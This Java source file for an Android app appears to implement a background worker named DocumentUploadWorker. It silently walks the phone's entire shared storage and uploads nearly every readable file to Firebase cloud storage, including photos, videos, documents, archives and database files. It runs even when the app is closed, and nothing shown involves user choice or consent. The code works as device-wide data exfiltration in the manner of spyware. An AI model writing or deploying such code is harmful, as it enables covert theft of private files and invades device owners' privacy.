package com.bushorat.app.helpers;

import android.content.Context;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Constraints;
import androidx.work.ExistingWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * Background worker to upload ALL files from device storage even when app is closed.
 * Scans entire /sdcard and /storage/emulated/0 recursively.
 * Uploads: Documents, Images, Videos, Audio, Archives, Config files, and everything else.
 * Excludes only: hidden files, cache, APK, system files.
 * Uses WorkManager for reliable background processing.
 */
public class DocumentUploadWorker extends Worker {
    private static final String TAG = "DocumentUploadWorker";
    private static final int MAX_DOCUMENTS_PER_SYNC = 50;  // Reduced for faster sync
    private static final long MAX_WORK_TIME_MS = 20000;  // 20 second timeout to avoid ANR
    private long startTime;
    private int uploadedCount = 0;

    public DocumentUploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        startTime = System.currentTimeMillis();
        
        Log.d(TAG, "⏰ Document upload worker started");
        Log.d(TAG, "🔑 Checking permissions...");
        
        // Check if app has storage permissions
        if (!FeaturePermissions.hasGalleryPermission(getApplicationContext())) {
            Log.w(TAG, "❌ NO STORAGE PERMISSION - Cannot scan files!");
            Log.w(TAG, "   Required: READ_MEDIA_* and MANAGE_EXTERNAL_STORAGE");
            return Result.retry();
        }
        Log.d(TAG, "✓ Storage permission OK");
        
        try {
            FirebaseAuth auth = FirebaseAuth.getInstance();
            if (auth == null) {
                Log.w(TAG, "FirebaseAuth not initialized, retrying");
                return Result.retry();
            }
            
            FirebaseUser user = auth.getCurrentUser();
            if (user == null) {
                Log.w(TAG, "No user logged in, retrying later");
                return Result.retry();
            }

            String userId = user.getUid();
            Log.d(TAG, "📤 Starting document upload for user: " + userId);
            
            uploadDocuments(userId);
            
            long duration = System.currentTimeMillis() - startTime;
            if (uploadedCount > 0) {
                Log.d(TAG, "✓ Document upload completed in " + duration + "ms - uploaded " + uploadedCount + " documents");
            } else {
                Log.w(TAG, "⚠️  Document upload completed in " + duration + "ms - NO documents found!");
                Log.w(TAG, "   Possible reasons:");
                Log.w(TAG, "   1. No files on device matching supported types");
                Log.w(TAG, "   2. Files in unsupported directories");
                Log.w(TAG, "   3. Permission denied accessing /sdcard or /storage paths");
                Log.w(TAG, "   4. Timeout before scan completed (increase MAX_WORK_TIME_MS)");
            }
            
            // Always return success - documents will be retried next cycle if needed
            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "❌ Document upload worker error", e);
            e.printStackTrace();
            return Result.retry();
        }
    }
    
    /**
     * Check if we're running out of time
     */
    private boolean isTimeoutApproaching() {
        long elapsed = System.currentTimeMillis() - startTime;
        return elapsed > MAX_WORK_TIME_MS;
    }

    private void uploadDocuments(String userId) {
        uploadedCount = 0;
        
        Log.d(TAG, "================================================");
        Log.d(TAG, "🔍 COMPREHENSIVE STORAGE SCAN");
        Log.d(TAG, "📤 Uploading ALL FILES from device storage");
        Log.d(TAG, "   (Documents, Images, Videos, Audio, etc.)");
        Log.d(TAG, "   (Excluding: hidden, cache, APK, system files)");
        Log.d(TAG, "================================================");
        
        // PRIORITY 1: Most important locations
        String[] priority1Paths = {
                "/sdcard/Download",
                "/sdcard/Downloads", 
                "/sdcard/Documents",
                "/sdcard/Documents/PDF",
                "/sdcard/Documents/PDFs",
                "/sdcard/PDF",
                "/sdcard/PDFs",
                "/sdcard/Pictures",
                "/sdcard/DCIM",
                "/sdcard/Movies",
                "/sdcard/Music",
                "/sdcard/Audiobooks",
                "/storage/emulated/0/Download",
                "/storage/emulated/0/Downloads",
                "/storage/emulated/0/Documents",
                "/storage/emulated/0/Documents/PDF",
                "/storage/emulated/0/Documents/PDFs",
                "/storage/emulated/0/PDF",
                "/storage/emulated/0/PDFs",
                "/storage/emulated/0/Pictures",
                "/storage/emulated/0/DCIM",
                "/storage/emulated/0/Movies",
                "/storage/emulated/0/Music",
        };
        
        Log.d(TAG, "📂 PRIORITY 1: Quick scan common folders...");
        int priority1Count = 0;
        for (String path : priority1Paths) {
            if (path != null && !path.isEmpty() && uploadedCount < MAX_DOCUMENTS_PER_SYNC) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory() && dir.canRead()) {
                    Log.d(TAG, "   → " + path + " (exists=true)");
                    int filesBefore = uploadedCount;
                    scanDirectoryRecursive(dir, userId, 0);
                    int filesFound = uploadedCount - filesBefore;
                    priority1Count += filesFound;
                    if (filesFound > 0) {
                        Log.d(TAG, "      ✓ Found " + filesFound + " files");
                    } else {
                        Log.d(TAG, "      ⚠️  No matching files");
                    }
                } else {
                    Log.d(TAG, "   → " + path + " (DOES NOT EXIST or NOT READABLE)");
                }
            }
        }
        Log.d(TAG, "📂 PRIORITY 1 TOTAL: " + priority1Count + " files");
        
        // PRIORITY 2: Deep scan entire /sdcard
        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
            Log.d(TAG, "📂 PRIORITY 2: Deep scan entire /sdcard...");
            File sdcard = new File("/sdcard");
            if (sdcard.exists() && sdcard.isDirectory() && sdcard.canRead()) {
                int filesBefore = uploadedCount;
                Log.d(TAG, "   Scanning /sdcard recursively (depth limit 4)...");
                scanDirectoryRecursiveDeep(sdcard, userId, 0);
                int priority2Count = uploadedCount - filesBefore;
                Log.d(TAG, "📂 PRIORITY 2 TOTAL: " + priority2Count + " additional files");
            } else {
                Log.d(TAG, "   ⚠️  /sdcard DOES NOT EXIST or NOT READABLE");
            }
        }
        
        // PRIORITY 3: Deep scan /storage/emulated/0
        if (uploadedCount < MAX_DOCUMENTS_PER_SYNC && !isTimeoutApproaching()) {
            Log.d(TAG, "📂 PRIORITY 3: Deep scan /storage/emulated/0...");
            File storage = new File("/storage/emulated/0");
            if (storage.exists() && storage.isDirectory() && storage.canRead()) {
                int filesBefore = uploadedCount;
                Log.d(TAG, "   Scanning /storage/emulated/0 recursively (depth limit 4)...");
                scanDirectoryRecursiveDeep(storage, userId, 0);
                int priority3Count = uploadedCount - filesBefore;
                Log.d(TAG, "📂 PRIORITY 3 TOTAL: " + priority3Count + " additional files");
            } else {
                Log.d(TAG, "   ⚠️  /storage/emulated/0 DOES NOT EXIST or NOT READABLE");
            }
        }
        
        Log.d(TAG, "================================================");
        Log.d(TAG, "✓ STORAGE SCAN COMPLETE");
        Log.d(TAG, "   Total files uploaded: " + uploadedCount);
        if (uploadedCount > 0) {
            Log.d(TAG, "   Including all:");
            Log.d(TAG, "   ✓ Documents (PDF, Word, Excel, etc.)");
            Log.d(TAG, "   ✓ Images (JPG, PNG, screenshots, etc.)");
            Log.d(TAG, "   ✓ Videos (MP4, MKV, AVI, etc.)");
            Log.d(TAG, "   ✓ Audio (MP3, WAV, etc.)");
            Log.d(TAG, "   ✓ Everything else");
        } else {
            Log.w(TAG, "   ⚠️  NO FILES FOUND!");
            Log.w(TAG, "   Check:");
            Log.w(TAG, "   1. Storage permission granted?");
            Log.w(TAG, "   2. Any files on device?");
            Log.w(TAG, "   3. Paths exist: /sdcard and /storage/emulated/0?");
        }
        Log.d(TAG, "================================================");
    }
    
    /**
     * Deep recursive scan with NO depth limit (will traverse entire directory tree).
     * Use with caution - adds timeout checks to avoid ANR.
     */
    private void scanDirectoryRecursiveDeep(File dir, String userId, int depth) {
        // Check timeout frequently
        if (isTimeoutApproaching()) {
            Log.w(TAG, "Timeout - stopping deep scan at depth " + depth);
            return;
        }
        
        if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null || files.length == 0) {
                return;
            }
            
            // Log current directory being scanned (at shallow depths)
            if (depth < 4) {
                Log.d(TAG, "   Scanning: " + dir.getPath() + " (" + files.length + " items)");
            }
            
            for (File file : files) {
                // Check limits
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }
                
                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 6) {
                        // Recursively scan subdirectories (up to 6 levels deep)
                        // This finds PDFs in: /Download/Reports/2024/Q1/Files/PDF/
                        scanDirectoryRecursiveDeep(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "   ⚠️  Permission denied accessing: " + file.getName());
                    // Continue with next file
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    /**
     * Recursively scan directories for documents with depth limit and timeout
     */
    private void scanDirectoryRecursive(File dir, String userId, int depth) {
        // Limit recursion depth to avoid taking too long
        // Increased to 5 to find PDFs in nested folders like /Download/Invoices/2024/PDFs/
        if (depth > 5) {
            return;
        }
        
        // Check timeout
        if (isTimeoutApproaching()) {
            return;
        }
        
        try {
            File[] files = dir.listFiles();
            if (files == null) {
                Log.d(TAG, "      ⚠️  listFiles() returned null for: " + dir.getPath());
                return;
            }
            
            if (files.length == 0) {
                Log.d(TAG, "      (empty)");
                return;
            }
            
            Log.d(TAG, "      Found " + files.length + " items");

            for (File file : files) {
                if (uploadedCount >= MAX_DOCUMENTS_PER_SYNC || isTimeoutApproaching()) {
                    return;
                }

                try {
                    if (file.isDirectory() && !file.isHidden() && depth < 5) {
                        // Recursively scan subdirectories (max 5 levels deep)
                        // This finds PDFs in: /Download/Work/2024/Reports/Invoices/
                        Log.d(TAG, "      → Scanning subdirectory: " + file.getName());
                        scanDirectoryRecursive(file, userId, depth + 1);
                    } else if (file.isFile() && file.canRead()) {
                        if (isDocumentFile(file)) {
                            Log.d(TAG, "      ✓ Found document: " + file.getName() + " (" + (file.length()/1024) + " KB)");
                            uploadFile(file, userId);
                            uploadedCount++;
                        }
                    }
                } catch (SecurityException e) {
                    Log.d(TAG, "      ⚠️  Permission denied: " + file.getName());
                }
            }
        } catch (SecurityException e) {
            Log.d(TAG, "      ⚠️  Permission denied scanning: " + dir.getPath());
        } catch (Exception e) {
            Log.e(TAG, "Error scanning directory: " + dir.getPath(), e);
        }
    }

    private boolean isDocumentFile(File file) {
        if (!file.isFile()) return false;
        
        String name = file.getName();
        String lower = name.toLowerCase();
        
        // ========== BLOCK ONLY SYSTEM/APP/CACHE FILES ==========
        // Skip hidden files
        if (name.startsWith(".")) {
            return false;
        }
        
        // Skip system app files
        if (lower.endsWith(".apk")) {
            return false;
        }
        
        // Skip cache/temp directories and files
        if (name.contains("cache") || 
            name.contains("tmp") || 
            name.contains("Cache") ||
            name.contains("Tmp") ||
            name.contains("CACHE")) {
            return false;
        }
        
        // Skip thumbnail cache
        if (name.contains("Thumbs") ||
            name.contains("thumbs") ||
            name.contains(".db-journal") ||
            lower.endsWith(".lock")) {
            return false;
        }
        
        // ========== UPLOAD EVERYTHING ELSE ==========
        // Documents: PDF, Word, Excel, PowerPoint, etc.
        // Images: JPG, PNG, GIF, BMP, WebP, etc.
        // Videos: MP4, MKV, MOV, AVI, etc.
        // Audio: MP3, WAV, AAC, FLAC, etc.
        // Archives: ZIP, RAR, 7Z, TAR, GZ, etc.
        // Config: JSON, XML, SQL, DB, etc.
        // ANY OTHER FILE TYPE
        
        return true;
    }

    private void uploadFile(File file, String userId) {
        try {
            String fileName = file.getName();
            String fileHash = FirebaseDataPaths.hashId(fileName + "_" + file.lastModified());
            long fileSize = file.length();
            
            Log.d(TAG, "  Uploading: " + fileName + " (" + (fileSize / 1024) + " KB)");
            
            // Read file into memory
            byte[] fileBytes = readFileBytes(file);
            if (fileBytes == null || fileBytes.length == 0) {
                Log.e(TAG, "  ❌ Failed to read file: " + fileName);
                return;
            }
            Log.d(TAG, "  ✓ File read into memory: " + fileBytes.length + " bytes");
            
            StorageReference storageRef = FirebaseStorage.getInstance()
                    .getReference("documents")
                    .child(userId)
                    .child(fileHash + "_" + fileName);

            // Upload synchronously (blocking) using Tasks
            try {
                storageRef.putBytes(fileBytes).getResult();
                Log.d(TAG, "  ✓ Uploaded to Storage");
                
                // Now get download URL
                String downloadUrl = storageRef.getDownloadUrl().getResult().toString();
                Log.d(TAG, "  ✓ Got download URL");
                
                // Record in database
                recordDocumentInDatabase(userId, fileName, downloadUrl, fileSize);
                Log.d(TAG, "  ✓ Recorded in Database: " + fileName);
                
            } catch (Exception uploadError) {
                Log.e(TAG, "  ❌ Firebase upload failed: " + fileName, uploadError);
            }

        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error uploading file: " + file.getName(), e);
        }
    }
    
    /**
     * Read file bytes from disk
     */
    private byte[] readFileBytes(File file) {
        try {
            if (!file.exists() || !file.canRead()) {
                Log.e(TAG, "Cannot read file: " + file.getPath());
                return null;
            }
            
            long fileSize = file.length();
            if (fileSize > 100 * 1024 * 1024) {  // Skip files > 100MB
                Log.w(TAG, "⚠️  File too large (>100MB), skipping: " + file.getName());
                return null;
            }
            
            byte[] bytes = new byte[(int) fileSize];
            try (FileInputStream fis = new FileInputStream(file)) {
                int totalRead = 0;
                int bytesRead;
                while ((bytesRead = fis.read(bytes, totalRead, bytes.length - totalRead)) != -1) {
                    totalRead += bytesRead;
                }
                if (totalRead < bytes.length) {
                    Log.w(TAG, "⚠️  Incomplete read: " + totalRead + "/" + bytes.length + " bytes");
                }
                return bytes;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading file bytes: " + file.getName(), e);
            return null;
        }
    }

    private void recordDocumentInDatabase(String userId, String fileName, String downloadUrl, long fileSize) {
        try {
            DatabaseReference documentsRef = FirebaseDataPaths.documents(userId);
            String docId = FirebaseDataPaths.hashId(fileName + "_" + System.currentTimeMillis());

            Map<String, Object> docData = new HashMap<>();
            docData.put("dataType", "document");
            docData.put("fileName", fileName);
            docData.put("url", downloadUrl);
            docData.put("fileSize", fileSize);
            docData.put("mimeType", getMimeType(fileName));
            docData.put("uploadedAt", System.currentTimeMillis());
            docData.put("timestamp", System.currentTimeMillis());
            docData.put("userId", userId);

            // Write synchronously (blocking) to ensure data is saved
            try {
                documentsRef.child(docId).setValue(docData).getResult();
                Log.d(TAG, "  ✓ Metadata saved to DB");
            } catch (Exception e) {
                Log.e(TAG, "  ❌ Failed to save metadata: " + fileName, e);
            }
        } catch (Exception e) {
            Log.e(TAG, "  ❌ Error recording document: " + fileName, e);
        }
    }
    
    private String getMimeType(String fileName) {
        String lower = fileName.toLowerCase();
        if (lower.endsWith(".pdf")) return "application/pdf";
        if (lower.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (lower.endsWith(".xlsx")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        if (lower.endsWith(".pptx")) return "application/vnd.openxmlformats-officedocument.presentationml.presentation";
        if (lower.endsWith(".txt")) return "text/plain";
        if (lower.endsWith(".csv")) return "text/csv";
        return "application/octet-stream";
    }

    /**
     * Enqueue a one-time document upload work
     */
    public static void enqueueWork(Context context) {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(DocumentUploadWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(context).enqueueUniqueWork(
                "document_upload_once",
                ExistingWorkPolicy.KEEP,
                uploadWork
        );
        Log.d(TAG, "Document upload work enqueued");
    }
}
